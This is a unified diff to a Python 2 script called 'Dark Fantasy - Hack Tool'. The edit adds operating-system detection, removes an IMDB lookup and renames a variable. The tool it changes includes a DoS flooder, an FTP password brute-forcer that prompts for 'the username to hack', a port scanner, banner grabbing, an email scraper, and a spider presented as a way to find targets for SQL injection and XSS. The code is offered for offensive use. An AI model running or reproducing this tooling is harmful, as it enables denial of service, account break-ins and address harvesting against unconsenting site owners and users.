@@ -10,10 +10,14 @@ from time import *
 from string import *
 from random import *
 import re
+import platform
+
 
 def dos(host):
-    subprocess.call('cls', shell=True)
-    subprocess.call('clear', shell=True)
+    if operSys=="Windows":
+		subprocess.call('cls', shell=True)
+    if operSys=="Linux":
+		subprocess.call('clear', shell=True)
     uagent=[]
     uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
     uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
@@ -28,7 +32,6 @@ def dos(host):
     print "[*]IP of the host: "+ip+"\n\n"
     conn=raw_input("Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
     conn=int(conn)
-    
     
     for i in range(conn):
         try:
@@ -52,32 +55,13 @@ def dos(host):
     
 
 
-def imdb(movie):
-    subprocess.call('cls', shell=True)
-    subprocess.call('clear', shell=True)
-    print "[*] Accessing IMDB database...\n"
-    m=urllib2.urlopen('http://www.imdb.com/find?ref_=nv_sr_fn&q='+movie.replace(' ','+')+'&s=all')
-    m=m.read()
-    for i in m.split('\n'):
-        if "result_text" in i:
-            if "/title/" in i:
-                if "/title/" in i.split('href=')[1].split('>')[0].strip("\"").split("?ref")[0]:
-                    link="http://www.imdb.com"+i.split('href=')[1].split('>')[0].strip("\"").split("?ref")[0]
-                
-    url=urllib2.urlopen(str(link))
-    for line in url.read().split('\n'):
-        if 'strong title' in line:
-            print line.split('title=')[1].split(">")[0]
-    main()
-    
-    
-            
-
     
 
 def scanner(host):
-    subprocess.call('cls', shell=True)
-    subprocess.call('clear', shell=True)
+    if operSys=="Windows":
+		subprocess.call('cls', shell=True)
+    if operSys=="Linux":
+		subprocess.call('clear', shell=True)
     t1=datetime.now()
     socket.setdefaulttimeout(2)
     print "[*] Scanning "+host
@@ -109,13 +93,12 @@ def scanner(host):
     print "[*] Scanning ended at: "+str(t2)+"\n"
     print "[*] Time taken= "+str(timetaken)
     main()
-
-    subprocess.call('cls', shell=True)
-    subprocess.call('clear', shell=True)
     
 def email(host):
-    subprocess.call('cls', shell=True)
-    subprocess.call('clear', shell=True)
+    if operSys=="Windows":
+		subprocess.call('cls', shell=True)
+    if operSys=="Linux":
+		subprocess.call('clear', shell=True)
     print"[*] Email addresses found on page: "
     try:
         e=urllib2.urlopen('http://'+str(host))
@@ -139,8 +122,10 @@ def email(host):
     main()
 
 def banner(host):
-    subprocess.call('cls', shell=True)
-    subprocess.call('clear', shell=True)
+    if operSys=="Windows":
+		subprocess.call('cls', shell=True)
+    if operSys=="Linux":
+		subprocess.call('clear', shell=True)
     try:
         s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     except:
@@ -162,21 +147,23 @@ def banner(host):
     main()
 
 def ftp(server):
-    subprocess.call('cls', shell=True)
-    subprocess.call('clear', shell=True)
+    if operSys=="Windows":
+		subprocess.call('cls', shell=True)
+    if operSys=="Linux":
+		subprocess.call('clear', shell=True)
     print "[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n"
-    password=[]
+    passwords=[]
     passw=raw_input("Enter the password file name(eg: pass.txt, wordlist.txt): ")
     username=raw_input("Enter the username to hack(eg: admin, root): ") 
     f=open(str(passw))
     f=f.read()
     f=f.split('\n')
     for i in f:
-        password.append(str(i))
+        passwords.append(str(i))
         
     server=socket.gethostbyname(server)
     
-    for password in password:
+    for password in passwords:
         try:
             s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         except:
@@ -206,8 +193,10 @@ def ftp(server):
     print "No password Found. Try another word list or username."
 
 def spider(host):
-    subprocess.call('cls', shell=True)
-    subprocess.call('clear', shell=True)
+    if operSys=="Windows":
+		subprocess.call('cls', shell=True)
+    if operSys=="Linux":
+		subprocess.call('clear', shell=True)
     print "[*] Use the result to find promising URLs to try hacking using SQL injection or Xss etc.\n[*] Depth is the level to go inside the website( between 10-20 is enough usually but depends on you).\n[*] Output will also be saved in text files in the same folder as this software.\n"
     depth = raw_input("Enter the depth level in numbers: ")
     count=1
@@ -242,17 +231,16 @@ def main():
     print "-"*60+"\n"
     print "                  Dark Fantasy - Hack Tool                    "
     print "-"*60+"\n"
-    print "1.Port Scanning\n2.DDOS\n3.Banner Grabbing\n4.Web spider(gather all URLs for web hacking)\n5.FTP Password Cracker\n6.Email Scraping\n7.IMDB Rating"
+    print "1.Port Scanning\n2.DDOS\n3.Banner Grabbing\n4.Web spider(gather all URLs for web hacking)\n5.FTP Password Cracker\n6.Email Scraping"
     choice=raw_input("Enter Your Choice: ")
-    hostname=raw_input("Enter Host Site or movie name(eg:wwww.google.com, www.yahoo.com, Batman, The Flash): ")
+    hostname=raw_input("Enter Host Site or IP adress (www.google.com, www.yoursite.com, 192.168.1.1)(dont add http:// or https://): ")
+    hostname=str(hostname)
     if choice=='1':
         scanner(hostname)
     elif choice=='6':
         email(hostname)
     elif choice=='3':
         banner(hostname)
-    elif choice=='7':
-        imdb(hostname)
     elif choice=='5':
         ftp(hostname)
     elif choice=='2':
@@ -262,5 +250,6 @@ def main():
     else:
         print "Wrong choice"
 
+operSys = platform.system()
 if __name__=='__main__':
     main()
